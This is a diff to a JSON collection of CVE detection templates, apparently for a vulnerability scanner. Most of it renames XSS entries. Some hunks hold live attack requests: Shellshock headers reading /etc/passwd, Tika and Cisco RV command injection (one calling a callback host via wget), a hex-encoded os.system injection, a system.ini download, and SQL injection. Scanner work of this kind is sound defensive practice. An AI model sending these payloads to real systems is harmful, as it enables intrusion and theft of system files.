@@ -225,7 +225,7 @@
     {
       "id": "CVE-2008-1061",
       "info": {
-        "name": "Wordpress Plugin Sniplets 1.2.2 - Cross-Site Scripting",
+        "name": "WordPress Sniplets <=1.2.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3948,7 +3948,7 @@
     {
       "id": "CVE-2015-4127",
       "info": {
-        "name": "WordPress Plugin church_admin - Cross-Site Scripting (XSS)",
+        "name": "WordPress Church Admin <0.810 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -5245,7 +5245,7 @@
     {
       "id": "CVE-2017-11629",
       "info": {
-        "name": "FineCms 5.0.10 - Cross Site Scripting",
+        "name": "FineCMS <=5.0.10 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6679,11 +6679,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -7419,7 +7419,7 @@
     {
       "id": "CVE-2018-19386",
       "info": {
-        "name": "SolarWinds Database Performance Analyzer 11.1. 457 - Cross Site Scripting",
+        "name": "SolarWinds Database Performance Analyzer 11.1.457 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -7434,7 +7434,7 @@
     {
       "id": "CVE-2018-19439",
       "info": {
-        "name": "Cross Site Scripting in Oracle Secure Global Desktop Administration Console",
+        "name": "Oracle Secure Global Desktop Administration Console 4.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -7527,7 +7527,7 @@
     {
       "id": "CVE-2018-19877",
       "info": {
-        "name": "Adiscon LogAnalyzer 4.1.7 - Cross Site Scripting",
+        "name": "Adiscon LogAnalyzer <4.1.7 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -8941,7 +8941,7 @@
     {
       "id": "CVE-2019-15501",
       "info": {
-        "name": "LSoft ListServ - XSS",
+        "name": "L-Soft LISTSERV <16.5-2018a - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -8971,7 +8971,7 @@
     {
       "id": "CVE-2019-15811",
       "info": {
-        "name": "DomainMOD 4.13.0 - Cross-Site Scripting",
+        "name": "DomainMOD <=4.13.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9016,7 +9016,7 @@
     {
       "id": "CVE-2019-15889",
       "info": {
-        "name": "WordPress Plugin Download Manager 2.9.93 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Download Manager <2.9.94 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9094,7 +9094,7 @@
     {
       "id": "CVE-2019-16332",
       "info": {
-        "name": "API Bearer Auth <= 20181229 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress API Bearer Auth <20190907 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9109,7 +9109,7 @@
     {
       "id": "CVE-2019-16525",
       "info": {
-        "name": "Wordpress Plugin Checklist <= 1.1.5 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Checklist <1.1.9 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9184,7 +9184,7 @@
     {
       "id": "CVE-2019-16931",
       "info": {
-        "name": "Visualizer < 3.3.1 - Stored Cross-Site Scripting (XSS)",
+        "name": "WordPress Visualizer <3.3.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9473,7 +9473,7 @@
     {
       "id": "CVE-2019-19134",
       "info": {
-        "name": "Hero Maps Premium < 2.2.3 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Hero Maps Premium <=2.2.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9488,7 +9488,7 @@
     {
       "id": "CVE-2019-19368",
       "info": {
-        "name": "Rumpus FTP Web File Manager 8.2.9.1 XSS",
+        "name": "Rumpus FTP Web File Manager 8.2.9.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9532,7 +9532,7 @@
     {
       "id": "CVE-2019-19908",
       "info": {
-        "name": "phpMyChat-Plus - Cross-Site Scripting",
+        "name": "phpMyChat-Plus 1.98 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9577,7 +9577,7 @@
     {
       "id": "CVE-2019-20141",
       "info": {
-        "name": "Neon Dashboard - Cross-Site Scripting",
+        "name": "WordPress Laborator Neon Theme 2.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9608,7 +9608,7 @@
     {
       "id": "CVE-2019-20210",
       "info": {
-        "name": "CTHthemes CityBook < 2.3.4 - Reflected XSS",
+        "name": "WordPress CTHthemes - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9786,7 +9786,7 @@
     {
       "id": "CVE-2019-3402",
       "info": {
-        "name": "Jira - Reflected XSS using searchOwnerUserName parameter.",
+        "name": "Jira <8.1.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9831,7 +9831,7 @@
     {
       "id": "CVE-2019-3911",
       "info": {
-        "name": "LabKey Server < 18.3.0 - XSS",
+        "name": "LabKey Server Community Edition <18.3.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9972,7 +9972,7 @@
     {
       "id": "CVE-2019-7219",
       "info": {
-        "name": "Zarafa WebApp Reflected XSS",
+        "name": "Zarafa WebApp <=2.0.1.47791 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10091,7 +10091,7 @@
     {
       "id": "CVE-2019-7543",
       "info": {
-        "name": "KindEditor 4.1.11, the php/demo.php - (XSS)",
+        "name": "KindEditor 4.1.11 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10210,7 +10210,7 @@
     {
       "id": "CVE-2019-8937",
       "info": {
-        "name": "HotelDruid 2.3.0 - XSS",
+        "name": "HotelDruid 2.3.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10346,7 +10346,7 @@
     {
       "id": "CVE-2019-9955",
       "info": {
-        "name": "Zyxel - Reflected Cross-site Scripting",
+        "name": "Zyxel - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10361,7 +10361,7 @@
     {
       "id": "CVE-2019-9978",
       "info": {
-        "name": "WordPress social-warfare RFI",
+        "name": "WordPress Social Warfare <3.5.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10512,7 +10512,7 @@
     {
       "id": "CVE-2020-11110",
       "info": {
-        "name": "Grafana Unauthenticated Stored XSS",
+        "name": "Grafana <=6.7.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10647,7 +10647,7 @@
     {
       "id": "CVE-2020-11930",
       "info": {
-        "name": "WordPress Plugin \"Translate WordPress with GTranslate\" (gtranslate) XSS",
+        "name": "WordPress GTranslate <2.8.52 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10698,7 +10698,7 @@
     {
       "id": "CVE-2020-12054",
       "info": {
-        "name": "Catch Breadcrumb < 1.5.7 - Unauthenticated Reflected XSS",
+        "name": "WordPress Catch Breadcrumb <1.5.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10843,6 +10843,20 @@
           "path": [
             "{{BaseURL}}/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5",
             "{{BaseURL}}/webadmin/out"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-13258",
+      "info": {
+        "name": "Contentful - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /?cda'\"</script><script>alert(document.domain)</script>&locale=locale=de-DE HTTP/1.1 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -11007,7 +11021,7 @@
     {
       "id": "CVE-2020-14408",
       "info": {
-        "name": "Agentejo Cockpit 0.10.2 - Reflected XSS",
+        "name": "Agentejo Cockpit 0.10.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -12069,9 +12083,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -12828,7 +12842,7 @@
     {
       "id": "CVE-2020-5191",
       "info": {
-        "name": "Hospital Management System 4.0 - Cross-Site Scripting",
+        "name": "PHPGurukul Hospital Management System - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -13214,7 +13228,7 @@
     {
       "id": "CVE-2020-8115",
       "info": {
-        "name": "Revive Adserver XSS",
+        "name": "Revive Adserver <=5.0.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -13244,7 +13258,7 @@
     {
       "id": "CVE-2020-8191",
       "info": {
-        "name": "Citrix ADC & NetScaler Gateway Reflected XSS",
+        "name": "Citrix ADC/Gateway - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -13321,7 +13335,7 @@
     {
       "id": "CVE-2020-8512",
       "info": {
-        "name": "IceWarp WebMail XSS",
+        "name": "IceWarp WebMail Server <=11.4.4.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -13454,7 +13468,7 @@
     {
       "id": "CVE-2020-9036",
       "info": {
-        "name": "Jeedom through 4.0.38 allows XSS",
+        "name": "Jeedom <=4.0.38 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -13532,7 +13546,7 @@
     {
       "id": "CVE-2020-9344",
       "info": {
-        "name": "Jira Subversion ALM for enterprise XSS",
+        "name": "Jira Subversion ALM for Enterprise <8.8.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -13652,7 +13666,7 @@
     {
       "id": "CVE-2020-9496",
       "info": {
-        "name": "Apache OFBiz XML-RPC Java Deserialization",
+        "name": "Apache OFBiz 17.12.03 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -13675,6 +13689,20 @@
           "path": [
             "{{BaseURL}}/actions/seomatic/meta-container/meta-link-container/?uri={{228*'98'}}",
             "{{BaseURL}}/actions/seomatic/meta-container/all-meta-containers?uri={{228*'98'}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-1472",
+      "info": {
+        "name": "Cisco Small Business RV Series - Authentication Bypass and Command Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /upload HTTP/1.1\nHost: {{Hostname}}\nCookie: sessionid='`wget http://{{interactsh-url}}`'\nAuthorization: QUt6NkpTeTE6dmk4cW8=\nContent-Type: multipart/form-data; boundary=---------------------------392306610282184777655655237536\n\n-----------------------------392306610282184777655655237536\nContent-Disposition: form-data; name=\"option\"\n\n5NW9Cw1J\n-----------------------------392306610282184777655655237536\nContent-Disposition: form-data; name=\"destination\"\n\nJ0I5k131j2Ku\n-----------------------------392306610282184777655655237536\nContent-Disposition: form-data; name=\"file.path\"\n\nEKsmqqg0\n-----------------------------392306610282184777655655237536\nContent-Disposition: form-data; name=\"file\"; filename=\"config.xml\"\nContent-Type: application/xml\n\nqJ57CM9\n-----------------------------392306610282184777655655237536\nContent-Disposition: form-data; name=\"filename\"\n\nJbYXJR74n.xml\n-----------------------------392306610282184777655655237536\nContent-Disposition: form-data; name=\"GXbLINHYkFI\"\n\n<input><fileType>configuration</fileType><source><location-url>FILE://Configuration/config.xml</location-url></source><destination><config-type>config-running</config-type></destination></input>\n-----------------------------392306610282184777655655237536--\n"
           ]
         }
       ]
@@ -13844,7 +13872,7 @@
     {
       "id": "CVE-2021-20137",
       "info": {
-        "name": "Gryphon Tower - Reflected XSS",
+        "name": "Gryphon Tower - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -13902,7 +13930,7 @@
     {
       "id": "CVE-2021-20792",
       "info": {
-        "name": "Quiz And Survey Master < 7.1.14 - Reflected Cross-Site Scripting",
+        "name": "WordPress Quiz and Survey Master <7.1.14 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14068,7 +14096,7 @@
     {
       "id": "CVE-2021-21799",
       "info": {
-        "name": "Advantech R-SeeNet v 2.4.12 - Cross Site Scripting",
+        "name": "Advantech R-SeeNet 2.4.12 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14083,7 +14111,7 @@
     {
       "id": "CVE-2021-21800",
       "info": {
-        "name": "Advantech R-SeeNet v 2.4.12 - Cross Site Scripting",
+        "name": "Advantech R-SeeNet 2.4.12 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14098,7 +14126,7 @@
     {
       "id": "CVE-2021-21801",
       "info": {
-        "name": "Advantech R-SeeNet graph parameter - Reflected Cross-Site Scripting (XSS)",
+        "name": "Advantech R-SeeNet - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14113,7 +14141,7 @@
     {
       "id": "CVE-2021-21802",
       "info": {
-        "name": "Advantech R-SeeNet device_id parameter - Reflected Cross-Site Scripting (XSS)",
+        "name": "Advantech R-SeeNet - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14128,7 +14156,7 @@
     {
       "id": "CVE-2021-21803",
       "info": {
-        "name": "Advantech R-SeeNet is2sim parameter - Reflected Cross-Site Scripting (XSS)",
+        "name": "Advantech R-SeeNet - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14304,7 +14332,7 @@
     {
       "id": "CVE-2021-22122",
       "info": {
-        "name": "FortiWeb v6.3.x-6.2.x Unauthenticated XSS",
+        "name": "FortiWeb - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14453,7 +14481,7 @@
     {
       "id": "CVE-2021-24176",
       "info": {
-        "name": "WordPress JH 404 Logger XSS",
+        "name": "WordPress JH 404 Logger <=1.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14498,7 +14526,7 @@
     {
       "id": "CVE-2021-24235",
       "info": {
-        "name": "Goto - Tour & Travel < 2.0 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Goto Tour & Travel Theme <2.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14528,7 +14556,7 @@
     {
       "id": "CVE-2021-24237",
       "info": {
-        "name": "Realteo WordPress Plugin <= 1.2.3 - Unauthenticated Reflected XSS",
+        "name": "WordPress Realteo <=1.2.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14543,7 +14571,7 @@
     {
       "id": "CVE-2021-24245",
       "info": {
-        "name": "WordPress Plugin Stop Spammers 2021.8 - Reflected XSS",
+        "name": "WordPress Stop Spammers <2021.9 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14557,7 +14585,7 @@
     {
       "id": "CVE-2021-24274",
       "info": {
-        "name": "Ultimate Maps by Supsystic < 1.2.5 - Reflected Cross-Site scripting (XSS)",
+        "name": "WordPress Supsystic Ultimate Maps <1.2.5 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -18509,7 +18537,7 @@
         {
           "raw": [
             "POST /classes/Login.php?f=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\nusername={{username}}&password={{password}}\n",
-            "POST /classes/Users.php?f=save HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nid=1&firstname=Adminstrator%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&lastname=Admin&username=admin\n",
+            "POST /classes/Users.php?f=save HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nid=1&firstname=Administrator%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&lastname=Admin&username=admin\n",
             "GET /admin/?page=user HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
@@ -20935,7 +20963,7 @@
         {
           "raw": [
             "POST /admin/ajax.php?action=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
-            "GET /admin/manage_user.php?id=-1%20union%20select%201,md5({{num}}),3,4,5--+ HTTP/1.1\nHost: {{Hostname}}\n"
+            "GET /admin/manage_booking.php?id=-1%20union%20select%201,2,3,4,5,6,md5({{num}}),8,9,10,11--+ HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -21234,7 +21262,7 @@
       "id": "CVE-2022-36642",
       "info": {
         "name": "Omnia MPX 1.5.0+r1 - Path Traversal",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
